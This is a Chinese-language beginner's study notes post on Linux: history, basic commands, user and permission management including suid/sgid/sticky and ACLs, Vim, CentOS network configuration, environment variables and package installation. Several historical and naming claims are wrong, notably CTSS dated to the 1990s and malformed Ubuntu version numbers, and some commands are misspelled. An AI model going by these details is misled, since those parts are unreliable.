Linux简介<b></h2><p>首先简单的介绍一下Linux的发展历史，简单的...</p><p>Linux的前身是Unix老大哥。</p><p>在当时的年代，计算机是稀有的巨型资源，为了解决多用户，MIT在20世纪90年代开发了分时操作系统（CTSS），可以让大型主机通过提供多个终端（terminal）连入主机。这个系统在未来逐渐演化成了Multics。</p><p>在此之后，开发上述系统的人员中的Ken Thompson 在1969年开发出了Unix的原型，实现了Linux中最著名的一句话：万物皆文件。</p><p>1973: Unix正式诞生。这是基于C语言的第一个正式版本。</p><p>1993: Debian诞生</p><p>1994年3月，Linux1.0发布，代码量17万行，当时是按照完全自由免费的协议发布，随后正式采用GPL协议。</p><p>1996年6月，Linux 2.0内核发布，此内核有大约40万行代码，并可以支持多个处理器。此时的Linux 已经进入了实用阶段，全球大约有350万人使用。</p><p>2004：Ubuntu诞生--版本号采用年份+月份的格式（如04.10，即Ubuntu2004.10版本），每半年就发行一个版本，其中只有2006.04因为发行LTS（long term support）版本而进行了跳票。</p><p>Linux是开源的Unix系统，可免费使用和传播。</p><p>一般学习 Linux，都要多多少少的夹杂一些硬件和内核的知识。对于硬件知识总觉得有些无聊...这里记一下老师推荐的一本关于内核的书 《深入理解Linux内核》。希望自己在对于基本操作熟练了以后能够继续去深读与研究。</p><p>那么到底什么是Linux--我也说不出来，靠着万能的搜索引擎给出一组定义：Linux是一套免费使用和自由传播的类Unix操作系统，是一个基于POSIX和UNIX的多用户、多任务、支持多线程和多CPU的操作系统。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。</p><p>对于操作系统有一定了解的话，大致的将Linux可以看做是内核与系统调用的两层。对于不同架构的CPU，其功能函数也不相同。</p><p>因此，对于不同CPU内核架构，Linux可以分为：x86系列，i386系列,arm系列等等......</p><p>说到分类，在Linux中还存在着两个派系：Redhat的红帽系列和Ubuntu系列。对于这两者的区别：Ubuntu更适合新手，其桌面化的GUI模式对新手比较友好；而Redhat更多的应用于企业级服务器。<br>更多的来说，这二者的内核差距并不是很大，最大的区别也就是安装包的管理上，Ubuntu使用的是基于Debian的deb包，而Redhat使用的是自己研发的yum管理。</p><p><b>总结一下：</b></p><ol><li>1.Linux根据内核分类：i386,x86,arm;<br>根据distrabution分类：Redhat,Debian。</li><li>2.Linux的优点：开源免费，消耗资源少，安全性高等等。</li></ol><h2 id="b-0x02-Linux-的简单操作-b"><b>0x02- - Linux 的简单操作<b></h2><p>打开一台Linux的机器，我们都需要做什么？或者是能够做什么呢？</p><p>贴一个关于Linux命令的网址：<a href="http://man.linuxde.net/">man</a><br>同时也可以使用自带的手册：man+[your commoand]查看命令帮助。</p><p><b>几个快捷键</b>：</p><table><thead><tr><th style="text-align:left">快捷键组合</th><th style="text-align:left">功能</th></tr></thead><tbody><tr><td style="text-align:left">ctrl + shift + c</td><td style="text-align:left">鼠标选中后复制</td></tr><tr><td style="text-align:left">ctrl + shift + v</td><td style="text-align:left">鼠标选中后粘贴</td></tr><tr><td style="text-align:left">ctrl + shift + t</td><td style="text-align:left">打开另一个命令行窗口</td></tr><tr><td style="text-align:left">ctrl + c</td><td style="text-align:left">强制终止</td></tr><tr><td style="text-align:left">ctrl + d</td><td style="text-align:left">离开当前界面(EOF)</td></tr><tr><td style="text-align:left">alt + 窗口号</td><td style="text-align:left">在窗口之间切换</td></tr><tr><td style="text-align:left">ctrl + a</td><td style="text-align:left">光标跳转到命令行的行首</td></tr><tr><td style="text-align:left">ctrl + e</td><td style="text-align:left">光标跳转到命令行的行尾</td></tr><tr><td style="text-align:left">上下方向键</td><td style="text-align:left">历史命令</td></tr></tbody></table><p>熟悉了几个操作之后，我们打开终端：<br><img src="/img/006IjVYfgy1fydbmxztwnj30kg0bhwgb.jpg" alt=""><br>(1)最外围的方括号是固定的<br>(2)dvk表示当前登录操作系统的用户名<br>(3)@符号，固定格式<br>(4)localhost表示当前系统的FQDN名称的主机名部分<br>(5)~表示当前用户所在目录层级的位置<br>(6)$号，代表的是其他普通用户，如果是root，会变成#符号</p><p><b>清屏</b>：clear</p><p><b>查看自己当前所处位置</b>：pwd<br>pwd命令显示的是绝对路径：<br>(1)绝对路径：就是按照目录树的层次结构，从根目录依次往下写路径的方式<br>(2)相对路径：就是相对于当前位置的路径表达方式</p><p><b>获取主机名</b>：hostname<br>如何设置主机名<br>(1)临时设置主机名<br>hostname [yourname]<br>这样设置的主机名在重启后会被重置掉<br>(2)永久设置主机名<br>hostnamectl set-hostname [yourname]<br>或是修改文件 /etc/sysconfig/network<br>以及 /etc/hosts 两个文件可以实现。</p><p><b>路径目录切换</b>：cd</p><p>cd + 目标路径（绝对路径/相对路径写法）<br>cd - 返回上次所在路径<br>cd ~ 跳转到当前登录用户的家目录<br>cd .. 返回上一层</p><p><b>创建文件、文件夹</b>：<br>(1)创建一个目录（文件夹）<br>mkdir + 创建对象的路径（绝对路径/相对路径写法）<br>(2)创建一个普通文件<br>touch + 创建对象的路径（绝对路径/相对路径）<br>(3)删除一个目录（文件夹）<br>rmdir + 删除对象的路径（绝对路径/相对路径），弃之不用<br>rm -r + 删除对象的路径（绝对路径/相对路径）<br>rm -rf + 删除对象的路径（绝对路径/相对路径），表示强制递归删除<br>(4)删除一个普通文件<br>rm + 删除对象的路径（绝对路径/相对路径），可选用-rf参数</p><p><b>拷贝、粘贴、重命名</b>：<br>cp /root/anaconda-ks.cfg /root/Desktop/拷贝<br>cp /root/anaconda-ks.cfg /root/Desktop/xxx.txt拷贝的同时重命名<br>mv /root/Desktop/anaconda-ks.cfg /root/Desktop/yyy.txt重命名<br>/root/anaconda-ks.cfg /root/Desktop/剪切<br>mv /root/anaconda-ks.cfg /root/Desktop/xxx.txt剪切的同时重命名</p><p><b>查看目录下的文件</b>：<br>ls + [查看对象路径]  类似windows中的大图标方式查看，只看到文件名<br>ls -l [查看对象路径] 类似windows中详细信息方式查看，看到文件名，创建者等<br>ls -al [查看对象路径] 可看到对象路径下的所有文件<br>.表示当前路径<br>..表示上层路径</p><p><b>查看文件</b>：<br>cat /root/anaconda-ks.cfg一次性将对象内容读出<br>more /root/anaconda-ks.cfg查看对象的路径将对象内容读出，并逐屏展示，只能向下不能向上<br>less /root/anaconda-ks.cfg查看对象的路径将对象内容如初，并逐屏展示，可向上向下，q退出<br>tail /root/anaconda-ks.cfg<br>tail -n 5 /root/anaconda-ks.cfg<br>head /root/anaconda-ks.cfg   查看文件的头部，默认前十行<br>head -n 5 /root/anaconda-ks.cfg</p><p><b>显示时间</b>：date</p><p><b>日历</b>：cal</p><p><b>简要查询</b>：wahtis+[your command]</p><p><b>切换工作空间</b>：ctrl+F1-F6</p><h2 id="b-0x03-用户和权限管理-b"><b>0x03- - 用户和权限管理<b></h2><p>Linux 支持多用户、多任务环境。</p><h3 id="font-color-LightSkyBlue-用户-font-br"><font color = "LightSkyBlue">用户</font><br></h3><p><b>创建用户</b><br>useradd + username<br>普通用户默认的家目录在/home/username<br>useradd -u 5000 username创建用户时指定用户的uid<br>useradd -g groupname username创建用户时同时指定用户的所属组<br>useradd -G groupname1,groupname2 username 创建用户时同时执行用户所属哪几个组</p><p><b>增加密码</b><br>passwd username</p><p><b>删除用户</b><br>userdel + username删除用户的登录信息（用户/密码）<br>这样会发现在home目录下依旧存留着删除用户的文件夹<br>userdel -r username彻底删除用户信息</p><p><b>创建用户组</b><br>groupadd + CCIE<br>groupadd -g 10000 LINUX 创建组的同时指定组ID</p><p><b>删除用户组</b><br>groupdel CCIE</p><p><b>查看用户信息</b><br>id + username</p><p><b>用户信息文件</b><br>/etc/passwd 和 /etc/shadow</p><p><img src="/img/006IjVYfgy1fydczrvejfj30hg092td5.jpg" alt=""></p><p>其格式：$id$salt$encrypted</p><p>1MD5</p><p>2aBlowfish(not in mainline glibc;added in some Linux distribution)</p><p>5SHA-256(since glibc 2.7)</p><p>6SHA-512(since glibc 2.7)</p><p>修改日期：这个是表明上一次修改密码的日期与1970-1-1相距的天数密码不可改的天数：假如这个数字是8，则8天内不可改密码，如果是0，则随时可以改。<br>密码需要修改的期限：如果是99999则永远不用改。如果是其其他数字比如12345，那么必须在距离1970-1-1的12345天内修改密码，否则密码失效。<br>修改期限前N天发出警告：比如你在第五条规定今年6月20号规定密码必须被修改，系统会从距离6-20号的N天前向对应的用户发出警告。<br>密码过期的宽限：假设这个数字被设定为M，那么帐号过期的M天内修改密码是可以修改的，改了之后账户可以继续使用。<br>帐号失效日期：假设这个日期为X，与第三条一样，X表示的日期依然是1970-1-1相距的天数，过了X之后，帐号失效。<br>保留：被保留项，暂时还没有被用上。</p><p><b>用户组信息文件</b><br>/etc/group</p><p><b>切换用户</b></p><p>su -username<br>退出用户/注销：exit</p><h3 id="font-color-LightSkyBlue-权限-font-br"><font color = "LightSkyBlue">权限</font><br></h3><p><b>文件权限</b><br>ls -l (等于ll)</p><p><img src="/img/006IjVYfgy1fydd7un284j30tk0fgwkj.jpg" alt=""><br>前部分显示的即为文件权限：</p><p><img src="/img/006IjVYfgy1fydd964r0rj30l40caju3.jpg" alt=""></p><p>d:目录类型的文件<br>-:普通文件<br>l:连接文件<br>b:块文件</p><p>r:读，数学值为4<br>w:写，数学值为2<br>x:执行，数学值为1，针对目录，x是表示是否可进入</p><p>rwx rwx rwx<br>usergroupother</p><p><b>修改文件权限</b></p><p><code># chmod u-w /root/Desktop/file-1</code><br><code># chmod u+w /root/Desktop/file-1</code><br><code># chmod g-x /root/Desktop/file-1</code><br><code># chmod o-x /root/Desktop/file-1</code></p><p><code># chmod 577 /root/Desktop/file-1</code><br><code># chmod 767 /root/Desktop/file-1</code><br><code># cmmod 776 /root/Desktop/file-1</code></p><p><b>修改文件所有者/所属组</b></p><p><code># chown student file-1 </code>将文件的所有者修改为student<br><code># chgrp harry file-1</code>将文件的所属组修改为harry<br><code># chown student:harry file-1</code>一次性同时修改文件所有者和所属组</p><p><b>umask值</b><br>创建一个文件时，文件的默认权限是由创建它们的进程设置。如，root用户通过touch创建的文件的权限为644，普通用户通过touch创建的文件的权限为664，root用户和普通用户创建的目录的权限为755。这些默认权限是由umask值控制。</p><p>获取当前环境用户的umask值：<br><code># umask</code><br>所有普通用户umask值的设置<br><code># vim /etc/profile</code><br><code># vim /etc/bashrc</code></p><p><b>特殊权限</b><br>1.suid(set uid)<br>(1)含义<br>只对文件有效，对目录无效。文件设置了suid后，其他用户执行该文件时，是以文件owner的身份来执行该文件。</p><p>(2)示例<br>Linux系统中一切皆文件，调用touch命令执行创建文件操作时，是调用touch这个可执行文件来创建文件。<br><code># which touch</code><br>/usr/bin/touch<br><code># ll /usr/bin/touch </code><br>-rwxr-xr-x. 1 root root 62432 Nov 20  2015 /usr/bin/touch</p><p>针对/usr/bin/touch这个可执行文件，所有者所属组和其他用户均有执行权限，即任何可登录系统的用户均可调用touch命令创建文件，且默认情况下“谁创建谁拥有”<br><code># su - harry</code><br><code>$ touch file-1</code><br><code>$ ll</code><br>-rw-rw-r--. 1 harry harry  0 Nov 26 10:01 file-1</p><p>设置/usr/bin/touch这个可执行文件的suid位<br><code># chmod u+s /usr/bin/touch </code><br><code># ll /usr/bin/touch </code><br>-rwsr-xr-x. 1 root root 62432 Nov 20  2015 /usr/bin/touch</p><p>/usr/bin/touch被设置了suid位后，harry用户再次调用touch创建文件<br><code># su - harry</code><br><code>$ touch file-2</code><br><code>$ ll</code><br>-rw-rw-r--. 1 harry harry 0 Nov 26 10:01 file-1<br>-rw-rw-r--. 1 root  harry 0 Nov 26 10:05 file-2</p><p>(3)设置suid位<br><code># chmod u+s filename</code><br><code># chmod 4755 filename</code></p><p>(4)应用场景<br>系统中任何用户都允许调用passwd命令修改自己的密码，修改密码时需要修改/etc/passwd /etc/shadow两个文件，但这两个文件的权限不允许普通用户修改，因此针对passwd这个可执行文件设置了suid<br><code># ll /etc/passwd /etc/shadow</code><br>-rw-r--r--. 1 root root 2538 Nov 25 11:35 /etc/passwd<br>----------. 1 root root 1716 Nov 25 13:45 /etc/shadow<br><code># which passwd</code><br>/usr/bin/passwd<br><code># ll /usr/bin/passwd </code><br>-rwsr-xr-x. 1 root root 27832 Jun 10  2014 /usr/bin/passwd</p><p>(5)总结<br>从系统安全角度出发，对于有些文件只允许管理员进行修改，但普通用于又需要通过某些进程命令访问修改，此时可以设置这些文件针对普通用户没有w和x权限，同时设置访问文件的进程命令的suid</p><p>2.sgid(set gid)<br>(1)含义<br>针对文件：文件设置了sgid后，其他用户执行该文件时，是以文件group的身份来执行该文件。<br>针对目录：目录设置了sgid后，用户在目录中新建的文件所属组将被自动设置为该目录的组。</p><p>(2)示例一，针对文件，以/usr/bin/touch这个可执行文件为例<br>未设置sgid之前，/usr/bin/touch这个可执行文件的权限状态<br><code># ll /usr/bin/touch </code><br>-rwxr-xr-x. 1 root root 62432 Nov 20  2015 /usr/bin/touch</p><p>切换到harry用户创建file-1，其所有者为harry，所属组为harry<br><code># su - harry</code><br><code>$ touch file-1</code><br><code>$ ll</code><br>-rw-rw-r--. 1 harry harry 0 Nov 26 11:02 file-1</p><p>以root用户设置/usr/bin/touch的sgid位<br><code># chmod g+s /usr/bin/touch </code><br><code># ll /usr/bin/touch </code><br>-rwxr-sr-x. 1 root root 62432 Nov 20  2015 /usr/bin/touch</p><p>以harry用户再创建一个文件file-2，file-2文件被创建时是以root组身份创建，因此file-2的所属组为root<br><code># su - harry</code><br><code>$ touch file-2</code><br><code>$ ll</code><br>-rw-rw-r--. 1 harry harry 0 Nov 26 11:02 file-1<br>-rw-rw-r--. 1 harry root  0 Nov 26 11:02 file-2</p><p>(3)示例二，针对目录<br>root用户创建一个共享目录，并修改权限使得普通用户具有写权限<br><code># mkdir /public</code><br><code># ll -d /public</code><br>drwxr-xr-x. 2 root root 6 Nov 26 11:11 /public<br><code># chmod 777 /public</code><br><code># ll -d /public</code><br>drwxrwxrwx. 2 root root 6 Nov 26 11:11 /public</p><p>未设置sgid情况下，harry用户创建的目录，其所有者和所属组均为harry<br><code># su - harry</code><br><code>$ mkdir /public/dir-harry-1</code><br><code>$ ll -d /public/dir-harry-1/</code><br>drwxrwxr-x. 2 harry harry 6 Nov 26 11:13 /public/dir-harry-1/</p><p>使用root用户设置/public的sgid位<br><code># chmod g+s /public</code><br><code># ll -d /public</code><br>drwxrwsrwx. 4 root root 42 Nov 26 11:15 /public</p><p>设置了sgid后，再使用harry用户创建目录，其所有者依然为harry，但所属组与/public所属组一致<br><code># su - harry</code><br><code>$ mkdir /public/dir-harry-2</code><br><code>$ ll /public</code><br>drwxrwxr-x. 2 harry harry 6 Nov 26 11:13 dir-harry-1<br>drwxrwsr-x. 2 harry root  6 Nov 26 11:15 dir-harry-2</p><p>(4)设置sgid位<br><code># chmod g+s filename</code><br><code># chmod 2755 filename</code></p><p>3.sticky<br>(1)含义<br>只对目录有效，对文件无效。目录设置了sticky后，对目录有写权限的用户只能删除其所拥有的文件，无法删除其他用户所拥有的文件，root用户除外。</p><p>(2)示例<br>未设置sticky时，权限足够的情况下，harry用户可删除root用户的文件<br><code># ll -d /public</code><br>drwxrwxrwx. 2 root root 6 Nov 26 11:43 /public<br><code># touch /public/file-root</code></p><p><code># su - harry</code><br><code>$ rm -rf /public/file-root </code></p><p>设置sticky时，权限足够的情况下，harry用户无法删除root用户的文件<br><code># chmod o+t /public/</code><br><code># ll -d /public/</code><br>drwxrwxrwt. 2 root root 6 Nov 26 11:44 /public/<br><code># touch /public/file-root</code></p><p><code># su - harry</code><br><code>$ rm -rf /public/file-root </code><br>rm: cannot remove ‘/public/file-root’: Operation not permitted</p><p>4.设置suid sgid sticky后，代表文件权限的9位字符的变化<br>suid：显示在文件user的x位，若文件user有x权限，则显示s；若没有x权限，则显示S<br>sgid：显示在文件group的x位，若文件group有x权限，则显示s；若没有x权限，则显示S<br>sticky：显示在文件other的x位，若文件other有x权限，则显示t；若没有x权限，则显示T</p><p><b>ACL权限</b><br>1.获取文件或目录的ACL信息<br><code># ll /public/file-root </code><br>-rw-r--r--. 1 root root 0 Nov 26 11:44 /public/file-root<br><code># getfacl /public/file-root </code><br>getfacl: Removing leading '/' from absolute path names<br># file: public/file-root<br># owner: root<br># group: root<br>user::rw-<br>group::r--<br>other::r--</p><p>2.设置ACL<br>针对file-root文件，other用户没有写权限，设置harry这个other类的用户可读可写可执行<br><code># setfacl -m u:harry:rwx /public/file-root</code><br><code># ll /public/file-root </code><br>-rw-rwxr--+ 1 root root 0 Nov 26 12:21 /public/file-root<br><code># getfacl /public/file-root </code><br>getfacl: Removing leading '/' from absolute path names<br># file: public/file-root<br># owner: root<br># group: root<br>user::rw-<br>user:harry:rwx<br>group::r--<br>mask::rwx<br>other::r--</p><p>3.ACL中的mask值<br>(1)mask值限制了ACL中的用户或组的最大权限<br>(2)默认情况下，mask值跟随ACL条目中最大的权限，确保相应的权限设置能被顺利实现（重新计算mask）<br>(3)每次设置一个新ACL条目时，如果当前mask所表示的权限小于新条目的设置权限，则mask跟随新条目的权限，反之则保持不变<br>(4)在设置ACL条目时，可加上-n参数让mask值不随新条目的权限增长变化</p><p>4.默认ACL，目录可这只默认ACL，这些ACL将由所有子文件自动继承<br><code># setfacl -m d:u:harry:rwx dir-1</code></p><p>5.删除ACL<br>-x, --remove=acl        remove entries from the ACL(s) of file(s)<br>-b, --remove-all        remove all extended ACL entries<br>-k, --remove-default    remove the default ACL</p><h2 id="b-0x04-Vim-使用-b"><b>0x04- - Vim 使用<b></h2><p><code># vim /root/Desktop/file-1</code><br>(1)阅读模式:只能阅读<br>(2)阅读模式进入编辑模式:<br>i(当前光标所在处插入)<br>a(当前光标所在处后一个字符插入)<br>o(当前光标所在行的下一行插入)<br>O(当前光标所在行的上一行插入)<br>(3)从编辑模式退出到阅读模式:Esc键<br>(4)撤销:在阅读模式下按u键<br>(5)复制粘贴:阅读模式下，光标移动到需要复制的行，yy复制，p粘贴。复制光标所在行往下2行（包含光标所在行），2y，p<br>(6)删除单个字符:阅读模式下，x键往后删一个字符，X键往前删一个字符<br>(7)删除光标位置到行尾内容，D键<br>(8)剪切整行，dd剪切光标所在行，p粘贴<br>(9)删除整行，dd剪切完了不粘贴<br>(10)删除可知的数行，数字加dd，如：2dd，删除光标所在行及其下一行<br>(11)删除未知的数行，通常加一个超大的数字如，10000dd<br>(12)临时为文件加上行号，阅读模式下，:set nu，取消行号:set nonu<br>(13)可以为vim编辑器设置永久行号，vim ~/.vimrc 写入set nu<br>(14)设置tab，vim ~/.vimrc 写入set ts=2<br>(15)跳转到行首行尾，阅读模式下，直接到行尾，G键，直接到行首，gg键<br>(16)具体跳转到某行，阅读模式下，行号加G，或者，:行号<br>(17)行选中，阅读模式下，v键，配合方向键调整<br>(18)矩形选中，阅读模式下，Ctrl + v,配合方向键调整选中<br>(19)替换某个字符，阅读模式下，调整光标到需要替换的位置，按r键，然后输入需要替换的字符<br>(20)查找,阅读模式下，/被查找的内容,所有符合查找内容的均被高亮显示，n键将光标转移至下一个匹配项，N键将光标转移至上一个匹配项<br>(21)查找替换,阅读模式下，:%s/被替换的内容/替换为的内容，注意默认只替换每一行第一个被匹配的内容，如需全文替换则%s/被替换的内容/替换为的内容/g<br>(22)保存，退出<br>:q,不保存修改而退出<br>:q!,不保存修改而强制退出<br>:w,保存不退出<br>:wq,保存退出<br>:wq!，保存强制退出<br>:x,执行，在vim中就是保存退出</p><h2 id="b-0x05-网络配置-b"><b>0x05- - 网络配置<b></h2><p>(1)ifconfig或者ifconfig -a命令用来查看硬件接口信息</p><p>(2)每一个网络接口的配置信息是以单独文件形式存在，存放在/etc/sysconfig/network-scripts/</p><p>(3)<code>#vim ifcfg-eno16777736</code></p><blockquote><p>TYPE=Ethernet网络类型<br>BOOTPROTO=dhcp获取IP的方式 dhcp/none/static<br>NAME=eno16777736设备别名<br>DEVICE=eno16777736设备名称<br>UUID=2cb9c49c-e534-49a5-ab2b-3d9fb2d36a77系统中该设备的唯一编号<br>ONBOOT=no开机启动/随服务启动</p></blockquote><p>(4)手工配置网络<br><code># systemctl stop NetworkManager</code>  关闭NM工具<br><code># systemctl disable NetworkManager  </code>让NM工具重启不启动<br><code>#systemctl status network</code>  检查一下提供网络服务的进程是否running<br><code># vim /etc/sysconfig/network-scripts/ifcfg-eno16777736</code></p><blockquote><p>TYPE=Ethernet<br>BOOTPROTO=static<br>NAME=eno16777736<br>UUID=2cb9c49c-e534-49a5-ab2b-3d9fb2d36a77<br>DEVICE=eno16777736<br>ONBOOT=yes<br>IPADDR=192.168.1.100<br>NETMASK=255.255.255.0<br>PREFIX=24<br>GATEWAY=192.168.1.1</p></blockquote><p><code># vim /etc/resolv.conf</code>配置DNS<br><code># nameserver 192.168.1.1</code></p><p><code># systemctl restart network</code>重新启动网络服务<br><code># ifdown eno16777736</code>关闭接口<br><code># ifup eno16777736</code>开启接口</p><p>(5)通过NetworkManager工具来管理网络<br><code># systemctl enable NetworkManager</code><br><code># systemctl start NetworkManager</code><br><code># nmcli connection show </code>查看当前网络连接<br><code># nmcli connection add con-name port0 ifname eno16777736 autoconnect yes type ethernet save yes</code><br><code># nmcli connection modify port0 ipv4.method auto</code>配置IP地址的获取方式为dhcp<br><code># nmcli connection up port0</code><br><code># nmcli connection modify port0 ipv4.addresses 192.168.1.200/24 ipv4.gateway 192.168.1.1 ipv4.dns 192.168.1.1 ipv4.method manual</code> 配置IP地址的获取方式为静态IP<br><code># nmcli connection up port0</code></p><p>(6)更改网卡名称:<br><code>$ vim /etc/sysconfig/network-scripts/ifcfg-****</code><br>将 NAME 值设置为 eth0<br>将 DEVICE 值设置为 eth0<br>保存退出，并重命名该文件为ifcfg-eth0<br><code># mv /etc/sysconfig/network-scripts/ifcfg-**** ifcfg-eth0</code><br>修改可预测命名规则:<br><code># vim /etc/default/grub</code><br>在GRUB_CMDLINE_LINUX 内添加内核参数&quot;net.ifnames=0 biosdevname=0&quot;<br>重新生成GRUB配置并更新内核参数<br><code># grub2-mkconfig -o /boot/grub2/grub.cfg</code><br>重启即可<br><code># reboot </code></p><h2 id="b-0x06-环境变量-b"><b>0x06- - 环境变量<b></h2><p>1.定义<br>一般是指在操作系统中用来指定操作系统运行环境的一些参数，如系统使用哪种shell，显示色彩，使用的语言和字符集等。</p><p>2.环境变量分类<br>(1).当前用户的环境变量（人的身高、体重、血压）<br>(2).当前用户使用的shell的变量（锻炼使用的跑步机可调节的速度范围和坡度范围）<br>(3).导出成用户变量的shell变量（一定时间内人跑步会使用固定的坡度和速度）</p><p>3.输出所有环境变量<br>env：显示当前用户的环境变量<br>set：显示当前shell的变量，包括当前用户的变量<br>export：显示当前导出成用户变量的shell变量。<br>每个shell有自己特有的变量（set）显示的变量，和用户变量是不同的，当前用户变量和使用什么shell无关，无论使用什么shell都在，比如HOME,SHELL等这些变量，但shell自己的变量不同shell是不同的，比如BASH_VERSION，这些变量只有set才会显示，是bash特有的，export不加参数的时候，显示哪些变量被导出成了用户变量，因为一个shell自己的变量可以通过export “导出”变成一个用户变量。</p><p>4.常用环境变量<br>PATH：命令查找路径echo $PATH<br>USER：当前登录用户echo $USER<br>HOSTNAME：系统hostnameecho $HOSTNAME<br>HISTSIZE：历史命令保留数值echo $HISTSIZE</p><p>5.存放环境变量的文件<br>(1)/etc/profile：用户登录Linux系统或使用su -命令切换到另一个用户时，该文件为用户设置环境信息,该文件被执行，并从/etc/profile.d目录的配置文件中搜集shell的设置<br>(2)/etc/profile.d：目录中存放的是一些脚本，其中包括了颜色、语言、less、vim及which等命令的一些附加设置。这些脚本文件之所以能够被自动执行，是因为在/etc/profile 中使用一个for循环语句来调用这些脚本。而这些脚本文件是用来设置一些变量和运行一些初始化过程的。<br>(3)/etc/bashrc：为每一个运行bash shell的用户执行此文件，当bash shell被打开时,该文件被读取<br>验证：<br>vim /etc/bashrc<br>echo &quot;hello&quot; &gt;&gt; /tmp/file.txt<br>每打开一个shell窗口，就会执行一次/etc/bashrc文件</p><p>(4)~/.bash_profile：每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次，默认情况下,他设置一些环境变量,执行用户的.bashrc文件。</p><p>(5)~/.bashrc：该文件存储的是专属于个人bash shell的信息，当登录时以及每次打开一个新的shell时，执行这个文件。在这个文件里可以自定义用户专属的个人信息。</p><h2 id="b-0x07-软件包的安装-b"><b>0x07- - 软件包的安装<b></h2><p>因使用的是centos，这里软件包管理软件使用rpm以及yum</p><p>一、rpm包<br>1.安装rpm -ivh vsftpd-3.0.2-10.el7.x86_64.rpm<br>2.查询系统中所有已安装的rpm包rpm -qa<br>3.查询某个rpm包有没有安装rpm -qa |grep vsftpd<br>4.查询某个已安装软件包包含哪些文件rpm -ql vsftpd<br>5.删除某个软件包rpm -e vsftpd<br>6.软件包升级rpm -Uvh vsftpd-3.2.2-10.el7.x86_64.rpm<br>注意点：在升级内核的时候<br>补充：内核版本查看uname -r。不同版本的内核在系统中可以共存，并且正常情况下，都可以用来启动，在做 内核升级的时候，基本上是采用rpm -ivh kernel-3.20.0-327.el7.x86_64.rpm，其原因主要是rpm -Uvh相当于安装新内核删除旧内核，而rpm -ivh是纯粹安装新内核，如此如果新内核有问题，还能够从旧内核启动</p><p>二、源码包<br>1.压缩型源码包，xxx.tar.gz，xxx.tar.bz2，xxx.tar.xz<br>（1）解压: tar -x[alpha]vf xxx.tar.[alpha]z<br>gz: [alpha] = z<br>bz2：[alpha] = j<br>xz：[alpha] = J<br>压缩/解压缩考验的是CPU和硬盘的性能</p><p>（2）配置安装环境<br>tar -x[alpha]vf xxx.tar.[alpha]z解压之后在压缩包所在的目录下生成一个同名的文件夹，需要进入到该文件夹中进行配置安装环境，一般情况下该文件夹下有一个configure的脚本，执行该脚本 ./configure，常用默认安装路径（/usr/bin，/usr/sbin，/usr/local/bin，/usr/local/sbin）配置也有参数，常用的参数--prefix=/opt，表示未来将/opt目录作为安装路径，其他参数参见configure文件</p><p>（3）编译（源码编译生成可执行文件）<br>make，可选参数为-j，-j表示采用多核进编译，例如make -j 8，采用8个核同时进行编译，加快速度。编译考量的是CPU性能</p><p>（4）安装（将软件所需的各种文件及权限放入该放入的地方）<br>make install，考量的是磁盘性能</p><p>2.rpm型源码包，命令xxx.src.rpm<br>1.有没有依赖性？大部分情况不具有依赖性<br>2.安装 rpm -ivh xxx.src.rpm，其实这里的rpm -ivh 与真正的rpm包的rpm -ivh含义可能不同，这里rpm -ivh更接近“解压”的含义<br>3.安装完成后一定会生成2个文件，一个是xxx.tar.[alpha]z，另一个是xxx.spec<br>4.利用rpmbuild工具根据xxx.spec文件对xxx.tar.[alpha]z进行编译，最终会生成xxx.rpm极其依赖包<br>5.利用rpm -ivh命令对最终生成的rpm包进行安装</p><p>针对1、2这两种类型的源码包，删除是比较麻烦的</p><p>三、yum<br>yum全称是Yellow Package Manager，是针对rpm包的依赖缺点，用来解决包依赖关系的工具，要使用yum需做如下事情：<br>1.要提供软件包来源。（本地（ISO镜像文件），来自于局域网/互联网上的yum源）<br>2.告知yum包管理器，软件包来源的位置。这点主要是通过配置文件编写的形式实现</p><p>如下选择来自互联网的源，则：<br>1.必须能联网<br>2.上述第二点就无需设置，其原因主要是系统安装完成后，已经生成相应的配置文件，路径是/etc/yum.repos.d，该目录下有诸多以.repo结尾的文件，就是指向互联网yum源的配置文件</p><p>（1）列出yum源的可用软件包：yum list available<br>（2）清除yum包管理器的缓存：yum clean all<br>（3）查询现有的yum源上是否有某款软件：yum search gcc<br>（4）安装gcc：yum install gcc [-y]，-y参数表示自动应答yum的提问，yum的方式安装软件时会自动解析软件所依赖的包，并一并装上这些依赖包<br>（5）删除：yum remove gcc [-y]，yum也会解析被卸载的包的依赖关系，在正确处理依赖关系后，yum只会删除需要卸载的软件包，而不会删除曾经安装它时那些因依赖而装上的软件包<br>（6）下载docker软件及其依赖软件：yumdownloader docker --resolve --destdir=/root/Desktop/packages<br>制作“索引”的过程 createrepo /root/Desktop/packages<br>编辑配置文件告知yum包管理器软件仓库的位置 vim /etc/yum.repos.d/docker.repo<br>[docker]<br>name=docker for Centos7<br>baseurl=file:///root/Desktop/packages<br>enabled=1<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<br>（7）将ISO镜像文件作为本地yum源</p><h4 id="参考链接">参考链接</h4><blockquote><p>0.有趣的命令 : <a href="http://mp.weixin.qq.com/s?__biz=MzA4ODIwMDUyNw==&amp;mid=2652994636&amp;idx=2&amp;sn=1f3b66c94de485c35b717c2295a196d5&amp;chksm=8bf8186cbc8f917a241b0724dffb618547326cda89199d7a4b8cd14326f987b5189ba9335139&amp;mpshare=1&amp;scene=24&amp;srcid=#rd">http://mp.weixin.qq.com/s?__biz=MzA4ODIwMDUyNw==&amp;mid=2652994636&amp;idx=2&amp;sn=1f3b66c94de485c35b717c2295a196d5&amp;chksm=8bf8186cbc8f917a241b0724dffb618547326cda89199d7a4b8cd14326f987b5189ba9335139&amp;mpshare=1&amp;scene=24&amp;srcid=#rd</a><br>1.漫画讲解Linux内核 : <a href="http://mp.weixin.qq.com/s?__biz=MzA4ODIwMDUyNw==&amp;mid=2652994485&amp;idx=1&amp;sn=7999fb43eca8f3c1eadb1a02475aa4b5&amp;chksm=8bf81f95bc8f96831c00e6d780c06c104b8316fd8696d7134222850dc5ba1d2380d558e33774&amp;mpshare=1&amp;scene=24&amp;srcid=#rd">http://mp.weixin.qq.com/s?__biz=MzA4ODIwMDUyNw==&amp;mid=2652994485&amp;idx=1&amp;sn=7999fb43eca8f3c1eadb1a02475aa4b5&amp;chksm=8bf81f95bc8f96831c00e6d780c06c104b8316fd8696d7134222850dc5ba1d2380d558e33774&amp;mpshare=1&amp;scene=24&amp;srcid=#rd</a>&quot;<br>2.man : <a 